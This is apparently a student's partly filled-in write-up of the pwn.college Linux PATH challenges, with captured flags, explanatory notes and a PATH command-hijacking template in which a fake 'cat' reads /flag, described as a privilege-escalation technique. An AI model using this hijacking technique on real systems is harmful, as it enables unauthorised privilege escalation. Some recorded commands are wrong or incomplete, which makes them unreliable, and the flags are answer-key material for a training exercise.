# PWN College - Linux Luminarium: Pondering PATH Challenges

## Challenge 1: The PATH Variable

Learn about the PATH environment variable and how Linux finds commands when you type them without a full path.

### Solution:

Describe your thought process and solve, write as much as possible with steps:

- removed the content for the path variable

Use this blob for pasting commands you've run:
```sh
$ rm
$ PATH=""
$ /challenge/run
```

### Flag: 

```
pwn.college{UQC90kHsvZWwWb2mt-g61W5RTEo.QX2cDM1wiN1EzNzEzW}
```

### Notes:
- `PATH` is an environment variable containing directories to search for commands
- View PATH with: `echo $PATH`
- Directories separated by colons: `/usr/bin:/bin:/usr/local/bin`
- When you type `ls`, shell searches each PATH directory in order
- First match is executed
- `which command` shows which binary will be executed
- `type command` shows how shell will interpret command

---

## Challenge 2: Setting PATH

Learn to modify the PATH variable to control where the shell searches for commands.

### Solution:

- overrid PATH with /challenge/more_commands.
- 
- 

Use this blob for pasting commands you've run:
```sh
$ PATH="/challenge/more_commands"
$ /challenge/run
```

### Flag: 

```
pwn.college{AeAVQroMIn-TySHHJqiQhEIa4-y.QX1cjM1wiN1EzNzEzW}
```

### Notes:
- `export PATH=/new/path` sets PATH to a specific value
- `export PATH=/new/path:$PATH` prepends to existing PATH
- `export PATH=$PATH:/new/path` appends to existing PATH
- Use `export` to make PATH available to child processes
- Changes only affect current shell session
- Colon `:` separates directories in PATH
- Without proper PATH, most commands won't work

---

## Challenge 3: Finding Commands

Use tools to locate where commands are stored in the filesystem and understand how PATH helps find them.

### Solution:

Describe your thought process and solve, write as much as possible with steps:

- used which command for finding win 

Use this blob for pasting commands you've run:
```sh
$ which win
$ ls /challenge/paths/31730/
$ cat /challenge/paths/31730/flag
```

### Flag: 

```
pwn.college{UGajDc2W876nfbDc3eYjP2xKmm6.01NzEzNxwiN1EzNzEzW}
```

### Notes:
- `which command` shows full path of command that will execute
- `type command` shows how shell interprets the command
- `type -a command` shows all matching commands in PATH
- `whereis command` finds binary, source, and man pages
- Commands must exist in a PATH directory to be found
- Absolute paths bypass PATH entirely
- Use these tools to debug PATH issues

---

## Challenge 4: Adding Commands

Create your own command and add it to a directory in PATH so it can be executed by name alone.

### Solution:
- Create a directory for your win command
- Create the win script (using absolute path for cat)
- Make it executable
- Add to PATH
- Run the challenge

Use this blob for pasting commands you've run:
```sh
$ which cat 
$ mkdir /tmp/mybin
$ cat > /tmp/mybin/win << "EOF"
$ chmod +x /tmp/mybin/win
$ export PATH=/tmp/mybin/win:$PATH
$ /challenge/run
```

### Flag: 

```
pwn.college{8N6cf0fQmnpl5WC-VK1Hpk4HYVc.QX2cjM1wiN1EzNzEzW}
```

### Notes:
- Create executable file in a PATH directory
- Or create custom directory and add it to PATH
- Make file executable: `chmod +x filename`
- Script should start with shebang: `#!/bin/bash`
- Commands in PATH can be invoked by name alone
- No need for `./` or full path if in PATH
- Common practice: use `~/bin` for personal commands
- Add to PATH: `export PATH=$HOME/bin:$PATH`

---

## Challenge 5: Hijacking Commands

Learn about command hijacking by creating a fake version of an existing command in a directory that's earlier in PATH. Intercept commands to gain control.

### Solution:

Describe your thought process and solve, write as much as possible with steps:

- 
- 
- 

Use this blob for pasting commands you've run:
```sh
$ 
$ 
$ 
$ 
```

### Flag: 

```
pwn.college{ }
```

### Notes:
- Shell searches PATH directories left to right
- First matching command is executed
- Create fake command in directory earlier in PATH
- Your fake command will be executed instead of real one
- Must use `export` so child processes inherit PATH
- Make fake command executable: `chmod +x`
- Common pattern:
  ```bash
  mkdir /tmp/hijack
  echo '#!/bin/bash' > /tmp/hijack/cat
  echo 'cat /flag' >> /tmp/hijack/cat
  chmod +x /tmp/hijack/cat
  export PATH=/tmp/hijack:$PATH
  /challenge/run
  ```
- Security implication: malicious PATH manipulation
- This is a common privilege escalation technique
- Always verify PATH in untrusted environments

---

## References:

- [PWN College - Linux Luminarium PATH](https://pwn.college/linux-luminarium/path/)
- [Bash Manual - Environment](https://www.gnu.org/software/bash/manual/html_node/Environment.html)
- [Linux PATH Environment Variable](https://www.baeldung.com/linux/path-variable)
- [Understanding PATH](https://opensource.com/article/17/6/set-path-linux)
- [Command Hijacking via PATH](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)

## Notes:

Include things you learnt, alternate methods or mistakes you made while solving:

### Key Concepts Learned:
- PATH is an environment variable listing directories to search for commands
- Format: colon-separated list of directories (`/usr/bin:/bin:/usr/local/bin`)
- Shell searches PATH directories left to right, first match wins
- Commands without path prefix (like `ls`) are found via PATH
- Absolute paths (`/bin/ls`) and relative paths (`./script`) bypass PATH
- `export` makes variables available to child processes
- Command hijacking: placing fake commands earlier in PATH
- Security implications of PATH manipulation
- `which command` shows which binary will be executed
- `type command` shows how shell will interpret command

### Common Mistakes:
- Forgetting to `export` PATH (child processes won't see it)
- Not making fake commands executable (`chmod +x`)
- Forgetting shebang (`#!/bin/bash`) in scripts
- Wrong PATH order (putting fake directory after real ones)
- Using spaces instead of colons in PATH
- Overwriting PATH instead of prepending: use `PATH=/new:$PATH`
- Not testing PATH changes before running challenge
- Forgetting that PATH affects ALL command lookups

### Alternative Methods:
- Prepending: `export PATH=/new:$PATH` (search new directory first)
- Appending: `export PATH=$PATH:/new` (search new directory last)
- Complete replacement: `export PATH=/only/this`
- Temporary for one command: `PATH=/tmp/fake:$PATH /challenge/run`
- Using command substitution in fake commands
- Calling real command from fake using absolute path

### Security Implications:
- PATH manipulation is a common privilege escalation technique
- Attackers can hijack commands to run malicious code
- Never trust PATH in untrusted environments
- SUID programs should use absolute paths internally
- Check PATH before running important commands
- Malware often modifies PATH in shell configs (`.bashrc`, `.profile`)
- Always verify `which command` shows expected binary
- In CTFs and pentesting, PATH hijacking is a key technique

### Debugging Tips:
- `echo $PATH` - view current PATH
- `which command` - find which binary will execute
- `type command` - show how shell interprets command
- `type -a command` - show all matching commands in PATH
- `ls -la /path/to/command` - verify permissions and ownership
- `cat /path/to/command` - inspect suspicious commands
- `/bin/bash --noprofile --norc` - start clean shell if PATH is broken
- `env` - view all environment variables including PATH

### Hijacking Command Template:
```bash
# 1. Create directory for fake commands
mkdir /tmp/fakecmds

# 2. Create fake command (example: cat)
cat > /tmp/fakecmds/cat << 'EOF'
#!/bin/bash
# Your malicious/helpful code here
/bin/cat /flag
EOF

# 3. Make it executable
chmod +x /tmp/fakecmds/cat

# 4. Prepend to PATH and export
export PATH=/tmp/fakecmds:$PATH

# 5. Run the target program
/challenge/run
```

### Real-World Applications:
- Development: using project-specific tool versions
- Version management: switching between tool versions (nvm, rbenv, pyenv)
- Custom utilities: making personal scripts accessible system-wide
- Testing: using modified versions of system commands
- Penetration testing: command hijacking for privilege escalation
- CTF competitions: exploiting writable PATH or SUID binaries
- System administration: organizing binaries by priority and purpose
